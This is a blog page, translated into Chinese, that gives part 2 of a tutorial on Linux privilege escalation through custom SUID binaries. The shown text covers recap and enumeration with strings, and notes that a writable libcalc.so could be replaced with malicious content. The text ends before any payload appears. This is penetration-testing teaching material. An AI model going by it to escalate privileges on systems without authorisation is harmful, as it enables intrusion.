<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Linux 提权/Linux 提权-SUID_SGID_2" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Linux 提权-SUID_SGID_2 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux 提权-SUID_SGID_2 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 SUID | SGID Part-2 – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 SUID | SGID Part-2 – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.3453dfb7.css">
<script src="/web/assets/js/runtime~main.799afac8.js" defer="defer"></script>
<script src="/web/assets/js/main.73484f69.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">🛠️软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/️渗透">🕵️渗透</a><button aria-label="折叠侧边栏分类 &#x27;🕵️渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="折叠侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Capabilities">Linux 提权-Capabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs">Linux 提权-Cron Jobs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器">Linux 提权-Docker 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器">Linux 提权-LXD 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF">Linux 提权-MySQL UDF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享">Linux 提权-NFS 共享</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1">Linux 提权-SUID_SGID_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2">Linux 提权-SUID_SGID_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1">Linux 提权-Sudo_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2">Linux 提权-Sudo_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-内核利用">Linux 提权-内核利用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻">Linux 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权指南">Linux 提权指南</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="展开侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">🐧Linux</a><button aria-label="展开侧边栏分类 &#x27;🐧Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">💻Windows</a><button aria-label="展开侧边栏分类 &#x27;💻Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">📦杂项</a><button aria-label="展开侧边栏分类 &#x27;📦杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/️渗透"><span itemprop="name">🕵️渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/linux-提权"><span itemprop="name">Linux 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux 提权-SUID_SGID_2</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux 提权-SUID_SGID_2</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/suid-sgid-part-2-lpe/" target="_blank" rel="noopener noreferrer">SUID | SGID Part-2 – Linux Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 上文回顾</a></li>
<li><a href="#id2">2 枚举自定义 SUID 二进制文件</a></li>
<li><a href="#id3">3 利用 SUID 二进制文件 – 共享对象注入</a>
<ul>
<li><a href="#id3.1">3.1 使用 Strings 和 Strace 提取信息</a></li>
<li><a href="#id3.2">3.2 制作恶意共享对象文件</a></li>
</ul>
</li>
<li><a href="#id4">4 利用 SUID 二进制文件 – PATH 注入</a>
<ul>
<li><a href="#id4.1">4.1 设置漏洞并获取 Root Shell</a>
<ul>
<li><a href="#id4.1.1">4.1.1 编辑 PATH 环境变量</a></li>
<li><a href="#id4.1.2">4.1.2 直接针对受害者制造漏洞</a></li>
<li><a href="#id4.1.3">4.1.3 利用 suid-path 获取 Root Shell</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id5">5 利用 SUID 二进制文件 – 滥用 Shell 功能</a>
<ul>
<li><a href="#id5.1">5.1 函数 – Bash 的秘密力量</a></li>
<li><a href="#id5.2">5.2 使用 Bash 函数获取Root Shell – 利用一</a></li>
<li><a href="#id5.3">5.3 更新 Bash 漏洞 – 利用二</a></li>
</ul>
</li>
<li><a href="#id6">6 利用 SUID 二进制文件 – 第三方程序中打包的二进制文件</a>
<ul>
<li><a href="#id6.1">6.1 确定 Maidag 的版本以查找漏洞</a></li>
<li><a href="#id6.2">6.2 添加恶意 Cron 作业并获取 Root Shell</a></li>
</ul>
</li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将继续讨论通过滥用 SUID 和 SGID 权限来提升权限的文章的第 2 部分。</p>
<blockquote>
<p>如果您尚未查看<a href="https://www.cnblogs.com/kqdssheng/p/18286462" target="_blank" rel="noopener noreferrer">第 1 部分</a>，我强烈建议您在阅读本文之前先从第 1 部分开始。</p>
</blockquote>
<p>在第 2 部分中，我们将回顾三种不同的自定义二进制文件，这些二进制文件都可以通过不同的方式被利用，利用方式包括：共享对象注入、PATH 注入、滥用 Shell 功能。</p>
<p>此外，我们还将审查第四种既非标准也非自定义的二进制文件，它完全属于另外一种类别。</p>
<p>在我们开始讨论漏洞利用示例之前，让我们快速回顾一下第 1 部分中介绍的内容。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1上文回顾"><strong><div id="id1">1、上文回顾</div></strong><a href="#1上文回顾" class="hash-link" aria-label="1上文回顾的直接链接" title="1上文回顾的直接链接">​</a></h2>
<p>在这篇文章的第 1 部分中，我们了解到：</p>
<ul>
<li>这三种特殊权限是什么以及它们如何工作 – SUID、SGID 和 Sticky</li>
<li>如何手动搜索 SUID 和 SGID 二进制文件</li>
<li>关于 LinPEAS 和 SUID3NUM 等可以帮我们搜寻 SUID 二进制文件的工具</li>
<li>GTFOBins 是什么以及如何使用它</li>
<li>如何利用六种不同的标准 SUID 二进制文件：<strong>env、find、tail、nano、cp</strong>、<strong>wget</strong></li>
</ul>
<p>在第一篇文章中枚举和利用 SUID 二进制文件之前，我们假设已在受害者身上获得了初步立足点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629872-1717373251-b1004f2af132786d1b8b75e811934f80.png" width="552" height="331" class="img_ev3q"></p>
<p>除了使用 LinPEAS 和 SUID3NUM 在受害者主机上发现的 6 个标准二进制文件之外，我们还发现了 4 个看起来很有趣的自定义二进制文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630953-992984604-2115fb18d8eccb90e662a3b3dbdfdc03.png" width="1024" height="671" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629711-1582631579-4002713ecb31c29dc43ae732609cfcaf.png" width="369" height="207" class="img_ev3q"></p>
<p>现在我们已经利用了六个标准二进制文件，在本文的第 2 部分，我们将把重点转移到利用四个自定义二进制文件：<strong>suid-so、suid-path、suid-sf</strong>、<strong>maidag</strong>。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2枚举自定义-suid-二进制文件"><strong><div id="id2">2、枚举自定义 SUID 二进制文件</div></strong><a href="#2枚举自定义-suid-二进制文件" class="hash-link" aria-label="2枚举自定义-suid-二进制文件的直接链接" title="2枚举自定义-suid-二进制文件的直接链接">​</a></h2>
<p>在系统上发现一些自定义二进制文件后，我们需要进一步枚举它们。</p>
<p>由于这些二进制文件是自定义的，我们很可能无法在 GTFOBins 上找到“快速获胜”的方法，因此我们需要进一步了解自定义二进制文件，以确定它们是否可以被利用。</p>
<p>在枚举自定义 SUID 二进制文件时，可以遵循以下“检查表”：</p>
<ul>
<li>与二进制文件交互 – 运行它，看看它做了什么</li>
<li>在 GTFOBins 上检查词条 – 可能工具显示它不在 GTFOBins 上，但无论如何都要检查一下</li>
<li>查找版本号 – 并在 Google 查找漏洞</li>
<li>从二进制文件中提取字符串 – 查找在程序运行时加载/执行的共享库或二进制文件</li>
<li>调试程序 – 深入了解程序的工作原理</li>
</ul>
<p>最后需要提到的是，自定义二进制文件通常有两种类型。</p>
<p><strong>类型 1 ：用户为特定任务或目的制作的内部二进制文件。这些通常非常基本并且很容易发现。</strong></p>
<p><strong>类型 2 ：通常与第三方程序一起打包/交付的自定义二进制文件。这些通常具有公开已知的漏洞并分配有 CVE。</strong></p>
<p>在下面的每个示例中，我们都将运行该“检查表”来查找漏洞，然后加以利用。</p>
<p>好吧，现在我们都已经了解了，让我们开始讨论一些漏洞利用示例。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="3利用-suid-二进制文件--共享对象注入"><strong><div id="id3">3、利用 SUID 二进制文件 – 共享对象注入</div></strong><a href="#3利用-suid-二进制文件--共享对象注入" class="hash-link" aria-label="3利用-suid-二进制文件--共享对象注入的直接链接" title="3利用-suid-二进制文件--共享对象注入的直接链接">​</a></h2>
<p>在利用自定义 SUID 二进制文件的第一个示例中，我们将查看在枚举期间找到的 suid-so 二进制文件。</p>
<p>由于我们不熟悉这个二进制文件，因此我们应该做的第一件事就是与它进行交互，看看它做了什么。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/suid-so</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629297-2005467687-f9b372e105e5b416c78350461cffc3fc.png" width="637" height="80" class="img_ev3q"></p>
<p>在这里我们可以看到，它计算了一些东西，达到 99%，然后完成并退出。</p>
<p>遗憾的是，这并不能让我们对这个二进制有多少了解。</p>
<p>尝试运行二进制文件后，我们应该检查的下一件事是该二进制文件是否在 GTFOBins 上。</p>
<p>幸运的是（或者说不幸的是），SUID3NUM 已经确定了 GTFOBins 上列出的二进制文件，而这并不是其中之一。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630127-1624555894-2e4b4081707aba27a8f894025ce1a98a.png" width="530" height="142" class="img_ev3q"></p>
<p>现在我们知道这个二进制文件在 GTFOBins 上没有“快速获胜”的方法，那么接下来我们应该做的就是检查二进制文件本身。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31使用-strings-和-strace-提取信息"><strong><div id="id3.1">3.1、使用 Strings 和 Strace 提取信息</div></strong><a href="#31使用-strings-和-strace-提取信息" class="hash-link" aria-label="31使用-strings-和-strace-提取信息的直接链接" title="31使用-strings-和-strace-提取信息的直接链接">​</a></h4>
<p>首先，我们可以使用 <strong>strings</strong> 命令来查看执行期间是否加载了任何二进制文件或共享库。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">strings /usr/bin/suid-so</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629406-1241821327-0a42811e08b380f9499e6a9de6202141.png" width="494" height="587" class="img_ev3q"></p>
<p>有趣的是，似乎在执行过程中从我们当前用户的主目录下加载了一个共享对象。</p>
<p>由于我们在主目录中有写权限，因此我们应该能够用恶意内容替换 <strong>libcalc.so</strong>。</p>
<p>在尝试利用这一点之前，让我们通过调试来仔细看看二进制文件在运行时在做什么。</p>
<p>对于我们的用例，我们最感兴趣的是查看程序运行时加载的内容，这就是为什么我们将使用 <strong>strace</strong> 进行调试。</p>
<blockquote>
<p>Strace 监视特定程序的系统调用和信号，并提供从开始到结束的执行顺序。当您没有源代码并且想要调试程序的执行时，它会很有帮助。</p>
</blockquote>
